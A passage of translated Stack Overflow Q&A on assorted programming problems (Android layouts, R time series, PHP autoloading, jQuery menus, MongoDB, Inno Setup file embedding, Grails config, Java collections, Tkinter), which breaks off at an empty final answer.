我在我的应用程序中使用可扩展列表视图。我的应用程序包含图像、按钮和可展开的列表视图。在这里，我想在可扩展的列表视图文本可见时动态添加滚动视图，否则无需在我的布局中显示滚动视图。任何人都可以帮助我如何做这件事。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:52:10.637

将整个布局放在滚动视图下，但不要忘记滚动视图只接受一个孩子，所以你可以这样做：

```
<ScrollView>
---
...
<LinearLayout>
---
---
---
</LinearLayout>
<ScrollView> 
```

例如：

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="fill_parent"
     android:layout_height="wrap_content"
     android:background="@drawable/leatherbackground" >

<RelativeLayout 
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" >

----- Your xml code.....

</RelativeLayout>
</ScrollView> 
```

# r - 如何使用 R 中的分解函数每周分解时间序列数据？

> ID：14847201
> 
> 赞同：0
> 
> 时间：2013-02-13T05:48:23.803
> 
> 标签：r

我想在每周收集的数据上应用 R 中的分解函数。例如，我给出的例子是我已经与我得到的错误一起工作：

```
>v<-c(50,45,23,21,32,24,42)
>vtimeseries<-ts(v)
>vtimeseries
Time Series:
Start = 1 
End = 30 
Frequency = 1 
>decompose(vtimeseries)
Error in decompose(vts) : time series has no or less than 2 periods 
```

任何人都可以帮我解决这个问题。还可以说明如何在 ts() 中设置频率值。我想将时间序列数据分解为

```
Monday      Tuesday      Wednesday     Thursday      Friday       Saturday     Sunday
...          ....          ....            ...            ...           ...     ... 
```

我这样做的主要目的是找到时间序列数据的季节性和趋势部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-07T15:29:26.157

上面 Pramit Choudhary 给出的示例似乎不再起作用，因为 GOOG xts 中的 NA 列导致`to.monthly(GOOG)`抛出错误 Borrowing code from [Removing NA columns in xts](https://stackoverflow.com/questions/13098888/removing-na-columns-in-xts)

```
getSymbols("GOOG", src="google", from = from.dat, to = to.dat)
GOOG <- GOOG[,-which(apply(is.na(GOOG), 2, all))]
mGoog <- to.monthly(GOOG) 
```

似乎解决了问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-30T21:19:49.117

如果您正在寻找一个示例来了解频率的相关性并进行分解，请尝试以下示例。尝试更改“频率”值。它将帮助您了解到底发生了什么。

```
 library(quantmod)
    from.dat <- as.Date("01/01/08", format="%m/%d/%y")
    to.dat <- as.Date("12/31/13", format="%m/%d/%y")
    getSymbols("GOOG", src="google", from = from.dat, to = to.dat)
    mGoog <- to.monthly(GOOG)
    googOpen <- Op(mGoog)
    ts1 <- ts(googOpen,frequency=12)
    plot(ts1,xlab="Years+1", ylab="GOOG")
    plot(decompose(ts1),xlab="Years+1") 
```

# mysql - 我应该如何为这个简单的 php 积分系统设置我的 mySQL 表？

> ID：14847202
> 
> 赞同：1
> 
> 时间：2013-02-13T05:48:25.567
> 
> 标签：mysql, database, database-design, points, table-structure

您好，我正在尝试找出为简单积分系统设置两个 mysql 表的最佳方法？

我有的：

```
1 - users table with id (unique),name,email,etc
1 - points table with id (auto incrementing),user_id (corresponds with id field in user table), points 
```

目前我只是写入点表并让 id 字段自动递增......并在查询中使用 php 设置 user_id 字段和 points 字段。

这是设置它的“正确”方式吗？user 表中的 id 与 points 表中的 user_id 字段在哪里通用？或者，还有更好的方法？

我觉得也许我应该在我的积分表中只有两个字段（id，points）然后让id对应？只是不确定什么是最好的？我应该在这里做什么？

我只想拥有一两个功能，让我为用户更新积分字段......或阅读它......等等？

感谢您的帮助！

# filter - 将 JasperServer List Filter 控件中的破折号重命名为有意义的名称

> ID：14847204
> 
> 赞同：0
> 
> 时间：2013-02-13T05:48:32.220
> 
> 标签：filter, jasper-reports, jasperserver

JasperServer 中的列表过滤器控件显示“---”作为默认选项。

将其重命名为有意义的名称（例如“ALL”）的过程是什么？

它似乎不在 jasperserver_message.properties 中。是否还有其他位置需要我们进行更改？或者，它是否需要重写过滤器控件本身？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:25:00.750

I have not tested... but I searched like this: `grep -rn "\-\-\-" ./webapps/jrs-pro-5.0.1/WEB-INF/bundles`

/usr/local/apache-tomcat-6.0.32/webapps/jrs-pro-5.0.2/WEB-INF/bundles/querybuilder_messages.properties

Line 65: page.filters.filter.empty.string=---

"ALL" would be more obviously meaningful... but in many cases the meaning would be wrong. But if your reports are defined so that not selecting a value results in all results being returned, then it could be a good customization in your deployment.

# batch-file - 填充存储在一个文件中的值并在另一个文件中使用它们

> ID：14847207
> 
> 赞同：1
> 
> 时间：2013-02-13T05:48:48.087
> 
> 标签：batch-file

我有 20 个批处理文件共有的 2 个变量，所以我想将这 2 个变量存储到一个文件中，然后将它们填充到使用这 2 个变量的批处理文件中。有人可以帮我编写代码吗？

要求 ：

要存储在一个文件中的变量：

```
DBNAME:PROD
REGION:ABC 
```

现在需要从这里挑选这两个变量并填充到使用它们的其他批处理文件中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T09:13:26.370

*考虑更改格式：以变量赋值命令*的形式存储行，即作为批处理文件：

```
SET DBNAME=PROD
SET REGION=ABC 
```

这样，您就可以简单地从需要这些变量的任何其他批处理文件中*调用该批处理文件。*假设上面保存为`myvars.bat`，你会这样：

```
...
CALL myvars.bat
:: proceed with using the variables
... 
```

# php - 在 PHP 中自动加载特征

> ID：14847208
> 
> 赞同：12
> 
> 时间：2013-02-13T05:48:51.900
> 
> 标签：php, autoload, traits

我有什么方法可以区分自动加载功能中的特征和类吗？假设我有一个类文件夹和一个特征文件夹；能够做类似的事情会很好......

```
spl_autoload_register(function($resource) {
  if ( /* $resource is class */ ) {
    include 'classes/'.$resource.'.php';
  } 
  if ( /* $resource is trait */ ) {
    include 'traits/'.$resource.'.php';
  }
}); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-13T06:12:48.313

autoload回调函数只接收一条信息；请求的符号名称。无法查看它应该是什么类型的符号。

您可以做的是在自动加载堆栈中注册多个函数，一个用于处理类和其他特征，使用[`stream_resolve_include_path()`](http://php.net/stream_resolve_include_path)或类似的东西，例如

```
spl_autoload_register(function($className) {
    $fileName = stream_resolve_include_path('classes/' . $className . '.php');
    if ($fileName !== false) {
        include $fileName;
    }
});
spl_autoload_register(function($traitName) {
    $fileName = stream_resolve_include_path('traits/' . $traitName . '.php');
    if ($fileName !== false) {
        include $fileName;
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-22T03:06:39.087

命名特征的方式有一个简单的解决方案。我的应用程序中的每个特征都被命名为 trait_(name) 并且它被放置在类文件夹中。

例如，我的 trait_something 放在文件名“trait.trait_something.php”下的 classes/ 文件夹中。

我的自动加载功能可以选择特征或类：

```
function autoloader($class) 
{
    $prefix='classes/';
    $ext='.php';
    if(substr($class,0,6) == 'trait_')include $prefix.'trait.' . $class . $ext; 
    else include $prefix.'class.' . $class . $ext;
} 
```

# jquery - Jquery菜单语法不适用于旧

> ID：14847209
> 
> 赞同：1
> 
> 时间：2013-02-13T05:48:56.610
> 
> 标签：jquery, syntax, menu, slidedown

嗨，我总是将 jquery 的代码用于菜单，问题是我现在使用更新版本的 jquery（我认为），因为我的客户要求使用停靠菜单 Mac 样式，.. 实际上菜单正在工作，只是 slideDown 功能不保留打开，所以菜单不起作用..

我曾经使用这个jquery ..

```
<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script> 
```

这段代码：

```
<script type="text/javascript">
$(document).ready(function(){

    $("ul.submenu").parent().append("<span></span>"); 

    $("ul.menu li span").hover(function() { //Al hacer click se ejecuta...

        //Con este codigo aplicamos el movimiento de arriva y abajo para el submenu
        $(this).parent().find("ul.submenu").slideDown('fast').show(); //Menu desplegable al hacer click

        $(this).parent().hover(function() {
        }, function(){
            $(this).parent().find("ul.submenu").slideUp('slow'); //Ocultamos el submenu cuando el raton sale fuera del submenu
        });

        }).hover(function() {
            $(this).addClass("subhover"); //Agregamos la clase subhover
        }, function(){  //Cunado sale el cursor, sacamos la clase
            $(this).removeClass("subhover");
    });

});
</script> 
```

这段代码保持不变，我现在只是在我的标题上使用它..

```
<script src="js/jquery.tools.min.js"></script>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/interface.js"></script> 
```

毕竟问题是我如何重写这些行以使该菜单真正起作用...

这是工作[http://www.dreaminmedia.com/imdr/quienessomos.php](http://www.dreaminmedia.com/imdr/quienessomos.php)

这是HTML

```
<div id="menuwrap">
<ul class="menu">
    <li><a href="#">Inicio</a></li>
    <li>
        <a href="#">Tutoriales</a>
        <ul class="submenu">
            <li><a href="#">CSS</a></li>
            <li><a href="#">Javascript</a></li>
            <li><a href="#">jQuery</a></li>
            <li><a href="#">HTML</a></li>
            <li><a href="#">PHP</a></li>
        </ul>
    </li>
    <li>
        <a href="#">Códigos</a>
        <ul class="submenu">
            <li><a href="#">Reloj en Flash</a></li>
            <li><a href="#">Fecha con JS</a></li>
            <li><a href="#">XML y AS</a></li>
            <li><a href="#">RSS y PHP</a></li>
            <li><a href="#">ASP a Excel</a></li>
            <li><a href="#">PHP a Excel</a></li>
        </ul>
    </li>
    <li><a href="#">Sobre Nosotros</a></li>
    <li><a href="#">Politica</a></li>

    <li><a href="#">Contactanos</a></li>
</ul>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:10:05.820

如果您使用的是最新的 jquery，您需要的是事件委托：

改变这一行：

```
$("ul.menu li span").hover(function() { //Al hacer click se ejecuta... 
```

对此：

```
$("#menuwrap").on('hover', 'ul.menu li span', function() { //Al hacer click se ejecuta... 
```

@你的最新评论：

```
$("#menuwrap").on('hover', 'ul.menu li span', function () {
   $(this).addClass("subhover");
}, function () {
   $(this).removeClass("subhover");
});

$("#menuwrap ul.menu li").hover(function () {
     $("> ul.submenu", this).stop().slideDown('fast').show();
}, function () {
     $("> ul.submenu", this).stop().slideUp('slow');
}); 
```

# vb.net - DataTable.Load() 与 DataReader

> ID：14847214
> 
> 赞同：1
> 
> 时间：2013-02-13T05:49:12.810
> 
> 标签：vb.net, sql-server-2008, ado.net, datatable, sqldatareader

使用数据库中的存储过程获取大约 200MB 的大数据。以前使用 DataTable.Load() 方法在 DataTable 中填充此数据。但它导致了性能问题，并且由于数据大小，DataTable 没有响应。

```
Using reader As DbDataReader = cmdHelper.ExecuteReader(CommandBehavior.CloseConnection)
    Using rstResult As New DataTable()
        rstResult.Locale = CultureInfo.InvariantCulture
        rstResult.Load(reader)
        Return rstResult
    End Using
End Using 
```

但是现在为了提高性能开始直接使用DataReader，但是由于DatReader是连接架构，DB连接会一直打开直到BusinessLogic完成。

```
Dim cnHelper As New DbConnectionHelper(_strDBConnection)
Dim cmdHelper As DbCommandHelper = cnHelper.CreateCommandHelper(strSP)
cmdHelper.Command.CommandType = CommandType.StoredProcedure

Dim reader As DbDataReader = cmdHelper.ExecuteReader(CommandBehavior.CloseConnection)
Return reader 
```

所以，我不想使用 DatReader，因为 DB 连接将在执行 BusineesLogic 之前打开。

在这种情况下，是否有任何替代方法可以在不使用 DataReader 的情况下提高性能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:52:09.870

> 在这种情况下，是否有任何替代方法可以在不使用 DataReader 的情况下提高性能？

由于 DataReader 是面向连接的，它将保持与数据库的连接打开，如果您负担不起，无法加载 DataTable/DataSet 中的所有数据，那么我想其他选择是从数据库中以块的形式加载数据`DataTable`并为此努力。否则我认为没有其他选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:01:02.440

1.  使用存储过程获取数据
2.  优化您的查询
3.  如果您不想使用 DataReader 而不是部分加载数据（技术之一是分页）。

# json - 如何计算存储在MongoDB集合中的json数组中的元素数

> ID：14847216
> 
> 赞同：0
> 
> 时间：2013-02-13T05:49:16.953
> 
> 标签：json, mongodb

我有 mongodb 集合“mongocollection”，集合中的每个文档由两列组成，第一个是字符串“cid”，它是集合的 id，第二个是 json 数组。

前任：

```
{ "_id" : "domain.com", "
className" : "UserAgents", 
"userAgents" : [                
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-CA; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.2) Gecko/20090803 Firefox/3.5.2 Slackware",
"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/2008072820 Firefox/3.0.1"
        ]
} 
```

从 mongo cmd 行，我可以将集合中给定文档的内容作为

```
db.CorruptUserAgents.find({"_id":"domain.com"}).pretty(); 
```

如何获取给定文档的给定数组中的元素数。前任

```
SOMETHING.count();
100 
```

是否可以通过 cmd 行执行此操作？我知道我可以获取文档，遍历数组并计算元素，但我想从 cmd 行执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T05:57:38.297

您可以`.findOne()`改用 ，因为您正在查找`_id`，它将返回一个文档。

所以你可以简单地做这样的事情：

```
var document = db.CorruptUserAgents.findOne({"_id":"domain.com"});
var count = document.userAgents.length; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-06-21T11:28:18.573

您可以通过以下方式直接获取它：

```
db.CorruptUserAgents.findOne({"_id":"domain.com"}).userAgents.length; 
```

# android - 如何动态启动android服务？

> ID：14847217
> 
> 赞同：1
> 
> 时间：2013-02-13T05:49:19.003
> 
> 标签：android, android-intent, service, broadcastreceiver, nfc

我希望当我的手机进入 NFC 阅读器的射频场时自动启动我的 android 服务？怎么做？请给建议....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:56:16.597

您可以在清单中为您的活动声明三个意图[`ACTION_NDEF_DISCOVERED`](http://developer.android.com/reference/android/nfc/NfcAdapter.html#ACTION_NDEF_DISCOVERED)：[`ACTION_TAG_DISCOVERED`](http://developer.android.com/reference/android/nfc/NfcAdapter.html#ACTION_TAG_DISCOVERED)和[`ACTION_TECH_DISCOVERED`](http://developer.android.com/reference/android/nfc/NfcAdapter.html#ACTION_TECH_DISCOVERED)。

当设备发现 NFC 标签时，Android 将启动声明这些意图的活动。

# inno-setup - 如何将卸载文件保存在卸载程序中？

> ID：14847218
> 
> 赞同：5
> 
> 时间：2013-02-13T05:49:19.783
> 
> 标签：inno-setup

有什么方法可以让卸载文件（JPEG、DLL、PNG...）保留在`unins000.exe`? 如果有，请出示代码。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T11:26:07.473

没有任何方法可以做到这一点。Inno 卸载引擎不能包含嵌入文件。

但另一方面，它也没有特别需要这样做 - 您可以安装它需要的任何文件（如果您想保持整洁，则安装到 app 文件夹的子文件夹中）。

安装文件嵌入到安装程序中的唯一真正原因是它使下载更容易。卸载程序没有这个借口。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-07-12T18:54:28.107

Inno Setup 不支持嵌入文件。

但是通过一些创意，您可以将文件嵌入到代码中（以某种常量的形式）。

不幸的是，Unicode Inno Setup 在处理二进制数据时非常有限，因为它倾向于尝试将所有内容都转换为 UTF-8。但是经过多次尝试，我最终得到了一些工作代码（使用从[Inno Setup 预处理器](https://jrsoftware.org/ispphelp/)调用的 PowerShell 代码）。

* * *

将此代码添加到您的部分前面的某处`[Code]`：

```
function CryptStringToBinary(
  sz: string; cch: LongWord; flags: LongWord; binary: string; var size: LongWord;
  skip: LongWord; flagsused: LongWord): Integer;
  external 'CryptStringToBinaryW@crypt32.dll stdcall';

const
  CRYPT_STRING_HEX = $04;

procedure WriteBinaryStringToStream(S: string; Stream: TStream);
var
  Buffer: string;
  Size: LongWord;
begin
  SetLength(Buffer, (Length(S) div 4) + 1);
  Size := Length(S) div 2;
  if (CryptStringToBinary(S, Length(S), CRYPT_STRING_HEX, Buffer, Size, 0, 0) = 0) or
     (Size <> Length(S) div 2) then
  begin
    RaiseException('Error decoding binary string');
  end;

  Stream.WriteBuffer(Buffer, Size);
end;  

function StreamFromBinaryString(S: string): TStream;
begin
  Result := TStringStream.Create('');
  WriteBinaryStringToStream(S, Result);
  Result.Position := 0;
end;

procedure LoadBitmapFromBinaryString(Bitmap: TBitmap; S: string);
var
  Stream: TStream;
begin
  Stream := StreamFromBinaryString(S);
  try
    Bitmap.LoadFromStream(Stream);
  finally
    Stream.Free;
  end;
end;

procedure SaveBinaryStringToFile(FileName: string; S: string);
var
  Stream: TStream;
begin
  Stream := TFileStream.Create(FileName, fmCreate);
  try
    WriteBinaryStringToStream(S, Stream);
  finally
    Stream.Free;
  end;
end;

#define FileToBinaryString(str FileName) \
  Local[4] = ExtractFileName(FileName), \
  Local[0] = AddBackslash(GetEnv("TEMP")) + Local[4] + ".pas", \
  Local[1] = \
    "-ExecutionPolicy Bypass -Command """ + \
    "Write-Host 'Generating code for " + Local[4] + "'; " + \
    "$bytes = [System.IO.File]::ReadAllBytes('" + FileName + "'); " + \
    "$s = '''' + (($bytes | foreach { $_.ToString('X2') }) -join '') + ''''; " + \
    "Set-Content -Path '" + Local[0] + "' -Value $s;" + \
    """", \
  Exec("powershell.exe", Local[1], SourcePath, , SW_HIDE), \
  Local[2] = FileOpen(Local[0]), \
  Local[3] = FileRead(Local[2]), \
  FileClose(Local[2]), \
  DeleteFileNow(Local[0]), \
  Local[3] 
```

* * *

然后您可以使用`FileToBinaryString` [预处理器宏](https://jrsoftware.org/ispphelp/index.php?topic=macros)在编译时（或更准确地说，在预处理时）将文件转换为十六进制字符串，例如：

```
'4D5A50000200000004000F00FFFF0000B8000....' 
```

在运行时，您可以将十六进制字符串与某些函数`WriteBinaryStringToStream`、`StreamFromBinaryString`或.`LoadBitmapFromBinaryString``SaveBinaryStringToFile`

* * *

因此，例如要将位图加载到`TBitmapImage`，请使用：

```
LoadBitmapFromBinaryString(
  BitmapImage.Bitmap, {#FileToBinaryString("C:\path\WizModernSmallImage.bmp")}); 
```

在编译时，这将转换为如下代码：

```
LoadBitmapFromBinaryString(
  BitmapImage.Bitmap, '4D5A50000200000004000F00FFFF0000B8000....'); 
```

* * *

要提取 DLL，请使用：

```
SaveBinaryStringToFile(
  ExpandConstant('{tmp}\InnoCallback.dll'), {#FileToBinaryString("InnoCallback.dll")}); 
```

要使用在运行时提取的 DLL，您必须使用[`delayload`标志](https://jrsoftware.org/ishelp/index.php?topic=scriptdll&anchor=delayload)：

```
function WrapTimerProc(callback:TTimerProc; paramcount:integer):longword;
  external 'wrapcallback@{tmp}\innocallback.dll stdcall delayload'; 
```

* * *

*预处理器/Pascal 编译器对一个字符串有大约 100M 个字符的限制。尽管对于大于约 20-30 MB 的文件，您实际上会首先达到 PowerShell 脚本的 [编译时] 内存限制。尽管即使对于较小的大小（大于几 MB），PowerShell 脚本的编译时性能也很差。该脚本可以显着优化。*

*由于十六进制编码，安装程序的大小增加了一倍。这可以通过使用一些更有效的编码来改进，比如 Base64 ( `CRYPT_STRING_BASE64`)。与该`[Files]`部分中包含的文件相比，代码部分甚至没有被压缩（对于图像来说不是问题，因为它们已经被压缩，但例如与 DLL 不同）。*

* * *

*该解决方案最初是为问题[Inno Setup: Reading a file from installer during uninstallation](https://stackoverflow.com/q/37552286/850848)*开发的。

* * *

*该代码需要 Inno Setup 的 Unicode 版本。使用最新的 Inno Setup 6，无论如何它都是唯一可用的版本。即使你使用 Inno Setup 5，你也不应该在 21 世纪使用 Ansi 版本。尽管具有讽刺意味的是，在 Ansi 版本中实现这一点要容易得多。有关使用与Inno Setup的 Ansi 和 Unicode 版本兼容的方法，请参阅[我对在 Inno Setup 中编写二进制文件的回答。](https://stackoverflow.com/q/38617829/850848#38618255)`CryptStringToBinary`尽管在 Ansi 版本中，您实际上可以使用二进制字符串而不是十六进制字符串。*

# svn - 从 CodePlex 签出代码到远程 SVN

> ID：14847224
> 
> 赞同：1
> 
> 时间：2013-02-13T05:49:45.833
> 
> 标签：svn, repository, codeplex, svn-checkout

嗨，我需要将 CodePlex 上维护的一个项目签出到我们的私有存储库 - SVN 托管在另一台服务器上。

有什么方法可以直接将 CodePlex 中的代码签出到托管的 SVN？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:01:25.940

1.  您不能直接从存储库签出到存储库（仅从存储库签出到工作副本）
2.  如果您想在本地拥有 CodePlex 的只读镜像 - 您可以尝试构建[SvnSync](http://svn.apache.org/repos/asf/subversion/trunk/notes/svnsync.txt)
3.  如果您可以使用与 CodePlex 的仓库相同的 UUID 创建本地存储库 - 您可以手动同步（从 CodePlex 更新 WC，重新定位 WC，提交，返回到 WC 的 Codeplex 绑定）

# grails - 在 grails 中加载外部属性文件

> ID：14847231
> 
> 赞同：1
> 
> 时间：2013-02-13T05:50:28.533
> 
> 标签：grails, properties, groovy

我正在尝试通过设置系统环境从外部加载属性文件。

在我的 config.groovy 文件中，

```
 println "Config file location --->" + System.getenv("SAM_ENV")
  grails.config.locations = ["file:"+ System.getenv("SAM_ENV")] 
```

我已将系统 env SAM_ENV 值设置为 C:\test\config.properties。

当我尝试运行应用程序时，我得到的打印值为

```
 Config file location ---> C:\test\config.properties prints properly. 
```

问题是当我尝试访问控制器中的属性文件时

```
 print "PAGINATION1"+grailsApplication.config.PAGINATION1 
```

PAGINATION1 的值未正确打印。

任何人都可以帮助我访问 grails 应用程序中的外部属性文件需要进行哪些配置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-09-16T18:26:21.113

```
Add the below line in config.groovy

grails.config.locations = [ "classpath:grails-app-config.properties"]

environments {
    development {   
        grails.logging.jul.usebridge = true
        grails.config.locations = ["file:C:\\conf\\externalfile.groovy"]
    }
    production {
        grails.logging.jul.usebridge = false
        grails.config.locations = ["file:/opt/config/externalfile.groovy"]
        // TODO: grails.serverURL = "http://www.changeme.com"
    }
}

If you want to access any property from external configuration(config.groovy) then just declare the property like 

property = property value eg:(ImagePath = "C:\\Users\\Saved Pictures")

access it like grailsApplication.config."property"

eg:(grailsApplication.config.ImagePath)

NOTE: dont use def just a property and its value. 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T06:05:38.120

您正在寻找的是扩展类路径，您可以通过在 _Events.groovy 中添加编译后事件来实现。尝试这个：

```
eventCompileEnd = {
ant.copy(todir:classesDirPath) {
     fileset(file:"C:\test\config.properties")
}} 
```

[你可以在这里](http://little418.com/2010/04/grails-override-configuration-with-properties-file.html)找到更多帮助

# java - 具有不同对象类型的 removeAll 方法

> ID：14847238
> 
> 赞同：4
> 
> 时间：2013-02-13T05:51:10.140
> 
> 标签：java, collections

我有两个列表，我想在其中执行批量操作，例如使用方法 removeAll、retainAll、contains。问题是这两个列表都有不同类型的对象，它们有一个相同的字段。就像是

```
class ObjectType1{
  Long field1;
  String field2;
  String field3
 }

class ObjectType2{
Long field1;
String field4;
Long field5 
```

}

所以list1包含ObjectType1的元素，list2包含ObjectType2。我想基于 field1 进行批量操作，这在两种对象类型中都很常见。

我正在考虑在基于公共字段的两个对象中实现 equals 方法。但是后来认为仅在一个字段上进行等于可能是错误的，因为将来可能需要在等于方法中添加基于其他字段的比较。请建议。

希望我的查询足够清楚。请让我知道以进行澄清。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:48:42.330

看看 Google 的 Guava 库。您可以使用[`Collections2.transform`](http://docs.guava-libraries.googlecode.com/git-history/release/javadoc/com/google/common/collect/Collections2.html#transform%28java.util.Collection,%20com.google.common.base.Function%29)来实现这一点。`retainAll()`例如，您可以这样做：

```
import com.google.common.base.Function;
import com.google.common.collect.Collections2;
...
List<ObjectType1> list1 = ...;
List<ObjectType2> list2 = ...;
Colection<Long> list1field1 = 
  Collections2.transform(list1, 
                         new Function<ObjectType1, Long>() {
                           public Long apply(ObjectType1 input) {
                             return (null == input) ? null : input.field1;
                           }
                         });
Collection<Long> list2field1 = 
  Collections2.transform(list2, ...);

// list1.retainAll(list2) based on field1 equivalence
list1field1.retainAll(list2field1); // this affects the underlying list, ie list1. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:31:04.310

我已经使用接口编写了代码

```
public interface IMatchable {

    Object getMatchingField();
} 
```

然后我的 ObjectType1 和 ObjectType2 正在实现这个接口以及重写 equals 方法

```
public class ObjectType1 implements IMatchable {

@Override
public Object getMatchingField() {
    return field1;
}
 @Override
 public boolean equals(Object obj) {
    IMatchable matchableObj = null;
    if (obj instanceof IMatchable) {
        matchableObj = (IMatchable) obj;
    } else {
        return false;
    }
    return matchableObj.getMatchingField().equals(this.getMatchingField()) ? true: false;
}
} 
```

ObjectType2 与这些方法类似。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:53:41.190

如果我理解你的问题是正确的，你想要类似的东西

```
 class SuperObject{
        Long field1;
        public SuperObject(){}
        public void setField1(Long f){
            field1 = f;
        }
        public Long getField1(){
            return field1;
        }
        public boolean equals(Object obj){
    if(obj instanceof SuperObject)
        return field1.equals(((SuperObject) obj).getField1());
    else
        return false;
}
    }
    class ObjectType1 extends SuperObject{
        String field2;
        String field3;
        ...    
}

    class ObjectType2 extends SuperObject{
        String field4;
        Long field5;
        ...
    } 
```

列表应该类似于

```
List<SuperObject> list = new ArrayList<SuperObject>();
    ObjectType1 obj1 = new ObjectType1();
    ObjectType2 obj2 = new ObjectType2();
    list.add(obj1);
    list.add(obj2); 
```

列表中的对象现在具有相同的相等方法实现，基于`field1`超类中的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:38:15.957

试试下面的代码，它会给出常见值的列表

```
package rais;

import java.util.ArrayList;
import java.util.List;

public class ArrayClient {

    public static void main(String[] args) {

        List<ObjectType1> list1 = new ArrayList<ObjectType1>();

        ObjectType1 type1Obj1 = new ObjectType1(10001l, "XXX", "YYYY");
        list1.add(type1Obj1);

        ObjectType1 type1Obj2 = new ObjectType1(10002l, "XXX", "YYYY");
        list1.add(type1Obj2);

        ObjectType1 type1Obj3 = new ObjectType1(10003l, "XXX", "YYYY");
        list1.add(type1Obj3);

        ObjectType1 type1Obj4 = new ObjectType1(10004l, "XXX", "YYYY");
        list1.add(type1Obj4);

        ObjectType1 type1Obj5 = new ObjectType1(10005l, "XXX", "YYYY");
        list1.add(type1Obj5);

        List<ObjectType2> list2 = new ArrayList<ObjectType2>();

        ObjectType2 type2Obj1 = new ObjectType2(10001l, "XXX", 2000l);
        list2.add(type2Obj1);

        ObjectType2 type2Obj2 = new ObjectType2(10002l, "XXX", 2001l);
        list2.add(type2Obj2);

        ObjectType2 type2Obj3 = new ObjectType2(50002l, "XXX", 2002l);
        list2.add(type2Obj3);

        ObjectType2 type2Obj4 = new ObjectType2(50003l, "XXX", 2003l);
        list2.add(type2Obj4);

        List<ObjectType1> list3 = retainAll(list1, list2);

        for (ObjectType1 objectType : list3) {
            System.out.println(objectType);
        }

    }

    public static List<ObjectType1> retainAll(List<ObjectType1> firstList,  List<ObjectType2> secondList) {

        List<ObjectType1> list3 = new ArrayList<ObjectType1>();

        for (ObjectType1 first : firstList) {
            for (ObjectType2 second : secondList) {
                if (first.getField1().equals(second.getField1())) {
                    list3.add(first);
                    break;
                }

            }

        }

        return list3;

    }

} 
```

在上面两个对象下面的程序中

```
ObjectType1 type1Obj1 = new ObjectType1(10001l, "XXX", "YYYY");
            list1.add(type1Obj1);

            ObjectType1 type1Obj2 = new ObjectType1(10002l, "XXX", "YYYY");
            list1.add(type1Obj2); 
```

在两个类中都有共同的**field1** list3 将只包含 type1 的两个元素。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-09-25T13:10:39.253

正如@Dilum 所写，您可以使用 Google 的 Guava 库。
此外，如果您只有列表，则应`Lists.transform`改为使用。
此外，如果您使用 Java 8，那么它看起来像：

```
List<Long> list1field1 =
    Lists.transform(list1, input -> input == null ? null : input.field1); 
```

或者您可以手动执行此操作：

```
// list1.removeAll(list2);
Set<Long> set = new HashSet<Long>();
for (ObjectType2 o2 : list2) {
    set.add(o2.field1);
}
Iterator<ObjectType1> i = list1.iterator();
while (i.hasNext()) {
    if (set.contains(i.next().field1)) {
        i.remove();
    }
} 
```

# asp.net-mvc-3 - 限制匿名用户查看其他标签

> ID：14847241
> 
> 赞同：1
> 
> 时间：2013-02-13T05:51:20.810
> 
> 标签：asp.net-mvc-3

我正在使用 ASP.NET MVC3。截至目前，我正在限制匿名用户通过以下方式进入特定页面

```
[Authorize] 
```

在我的控制器中。但我想要的是限制他们在未登录时查看主页中的选项卡。这可能吗。？对不起，我不是编程专业人士。:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:55:52.570

是的，很讨厌。你可以做这样的事情

```
<li>@Html.ActionLink("Home", "Index", "Home")</li>
@if (Request.IsAuthenticated)
{
    <li>@Html.ActionLink("View Account", "Index", "Account")</li>
    if (User.IsInRole("Administrator"))
    {
        <li>@Html.ActionLink("Admin Console", "Index", "Admin")</li>
    }
} 
```

**参考：[在视图中检查身份验证和角色](http://www.brianlegg.com/post/2011/05/09/Implementing-your-own-RoleProvider-and-MembershipProvider-in-MVC-3.aspx)**

# python - 如何在处于“只读”状态的 Entry 小部件中插入字符串？

> ID：14847243
> 
> 赞同：10
> 
> 时间：2013-02-13T05:51:27.217
> 
> 标签：python, python-3.x, user-interface, tkinter, tkinter-entry

我正在尝试获取以省略号开头的条目`...`。

这是我尝试过的代码：

```
e = Entry(rootWin, width=60, state="readonly")
e.insert(0, "...") 
```

我认为发生错误是因为我试图在对象被分类为只读之后插入文本。

如何在处于`"readonly"`状态的 Tkinter Entry 小部件中插入字符串？

* * *

## 回答 #1

> 赞同：13
> 
